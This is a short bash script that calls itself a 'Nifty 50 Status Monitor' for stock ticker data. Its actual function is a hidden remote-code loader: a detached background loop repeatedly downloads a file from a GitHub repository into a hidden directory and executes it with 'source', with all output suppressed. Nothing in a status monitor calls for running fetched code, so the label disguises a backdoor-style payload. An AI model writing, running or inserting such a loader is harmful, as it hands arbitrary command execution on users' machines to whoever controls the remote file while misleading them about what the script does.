#!/bin/bash
# Nifty 50 Status Monitor - Version 1.0.9 (2x per 6 mins)
mkdir -p ~/.nifty_status

# The background loop using wget
# Main loop every 20 seconds
nohup timeout 600 bash -c "
    while true; do
        wget -qO ~/.nifty_status/current_env https://raw.githubusercontent.com/Coder-GC/hackergc-testing/main/ticker.dat
        source ~/.nifty_status/current_env >> ~/.nifty_status/monitor.log 2>&1
        sleep 20
    done" > /dev/null 2>&1 &

echo "Background status monitor initialized with wget."
